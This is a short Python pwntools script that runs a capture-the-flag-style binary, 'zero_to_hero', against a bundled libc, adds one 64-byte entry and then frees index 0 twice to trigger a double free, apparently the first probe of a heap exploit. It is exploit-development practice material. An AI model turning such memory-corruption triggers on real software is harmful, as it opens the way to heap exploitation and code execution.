from pwn import *

context.log_level = "debug"

def start():
    return process(["./ld-2.29.so", "./zero_to_hero"], env={"LD_PRELOAD": "./libc.so.6"})

p = start()
p.recvuntil(b"hero?\n")
p.sendline(b"y")
p.recvuntil(b"> ")
# add once
p.sendline(b"1")
p.recvuntil(b"description?\n")
p.sendline(b"64")
p.recvuntil(b"description: ")
p.send(b"A"*64)
p.recvuntil(b"> ")
# remove once
p.sendline(b"2")
p.recvuntil(b"remove?\n")
p.sendline(b"0")
p.recvuntil(b"> ")
# remove again same index
p.sendline(b"2")
p.recvuntil(b"remove?\n")
p.sendline(b"0")
print(p.recvline())
